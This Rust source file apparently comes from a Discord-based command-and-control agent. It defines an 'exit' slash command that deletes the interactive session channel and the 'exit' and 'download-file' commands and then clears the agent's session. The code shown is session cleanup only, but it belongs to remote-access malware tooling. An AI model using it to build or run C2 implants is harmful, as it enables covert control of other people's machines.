use crate::commands::sessions::get_command_id_by_name;
use crate::errors::DiscordC2Error;
use crate::utils::agent::get_or_create_agent;

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::{
        application::command::Command,
        id::CommandId,
    },
};

/// Registers the "exit" application command.
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("exit")
        .description("Exit the current interactive command session.")
}

/// Deletes the session channel and the "exit" command, and nullifies the session channel in the agent.
pub async fn run(ctx: &Context) -> Result<String, DiscordC2Error> {
    let mut agent = get_or_create_agent(ctx).await;
    let session_channel = agent.get_session_channel().ok_or_else(|| DiscordC2Error::NoSessionChannel)?;

    session_channel.delete(&ctx.http).await?;
    let command_id = get_command_id_by_name(&ctx, "exit").await
        .ok_or_else(|| DiscordC2Error::CommandNotFound("exit".to_string()))?;
    let download_id = get_command_id_by_name(&ctx, "download-file").await.ok_or_else(|| DiscordC2Error::CommandNotFound("download-file".to_string()))?;

    Command::delete_global_application_command(&ctx.http, CommandId::from(command_id)).await?;
    Command::delete_global_application_command(&ctx.http, CommandId::from(download_id)).await?;

    agent.set_session_channel(None)
        .map_err(|e| DiscordC2Error::AgentError(e.to_string()))?;

    Ok(String::new())
}
